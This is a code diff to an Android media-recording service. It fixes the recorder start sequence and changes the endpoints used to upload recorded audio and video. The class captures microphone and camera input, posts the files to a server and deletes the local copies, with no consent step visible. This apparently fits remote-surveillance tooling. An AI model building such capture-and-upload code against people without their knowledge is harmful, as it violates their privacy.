@@ -58,25 +58,26 @@ public class MediaRecordService {
 
     public void startRecordAudio() {
         stopRecordAudio();
-        mMediaRecorder = new MediaRecorder();
-        mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-        mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
-        mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-        mMediaRecorder.setAudioEncodingBitRate(96000);
-        mMediaRecorder.setAudioSamplingRate(48 * 1000);
-        mMediaRecorder.setAudioChannels(1);
-
-        String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "3gp");
-        path = FileUtils.getExternalFullPath(App.getInstance(), fileName);
-        mMediaRecorder.setOutputFile(path);
-        mMediaRecorder.setAudioChannels(1);
         try {
+            mMediaRecorder = new MediaRecorder();
+            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            mMediaRecorder.setAudioEncodingBitRate(96000);
+            mMediaRecorder.setAudioSamplingRate(48 * 1000);
+            mMediaRecorder.setAudioChannels(1);
+
+            String fileName = String.format("%s.%s", DateUtils.date2String(new Date(), "yyyyMMdd_HHmmss"), "3gp");
+            path = FileUtils.getExternalFullPath(App.getInstance(), fileName);
+            mMediaRecorder.setOutputFile(path);
+
             mMediaRecorder.prepare();
+            mMediaRecorder.start();
+            isStart = true;
         } catch (IOException e) {
             e.printStackTrace();
             stopRecordAudio();
         }
-        mMediaRecorder.start();
     }
 
     public void startRecordVideo(Integer cameraId) {
@@ -128,7 +129,7 @@ public class MediaRecordService {
         releaseCamera();
         if (isStart && !TextUtils.isEmpty(path)) {
             final File file = new File(path);
-            OkHttpUtils.postAsync(ApiConfig.getVideo(), new HttpParams().addFile("video", file), new HttpCallback(BaseResponse.class) {
+            OkHttpUtils.post(ApiConfig.takeVideo(), new HttpParams().addFile("video", file), new HttpCallback(BaseResponse.class) {
                 @Override
                 public void onSuccess(BaseResponse httpResponse, Headers headers) {
                     FileUtils.delete(file);
@@ -148,7 +149,7 @@ public class MediaRecordService {
         releaseMediaRecorder();
         if (isStart && !TextUtils.isEmpty(path)) {
             final File file = new File(path);
-            OkHttpUtils.postAsync(ApiConfig.getAudio(), new HttpParams().addFile("audio", file), new HttpCallback(BaseResponse.class) {
+            OkHttpUtils.post(ApiConfig.takeAudio(), new HttpParams().addFile("audio", file), new HttpCallback(BaseResponse.class) {
                 @Override
                 public void onSuccess(BaseResponse httpResponse, Headers headers) {
                     FileUtils.delete(file);
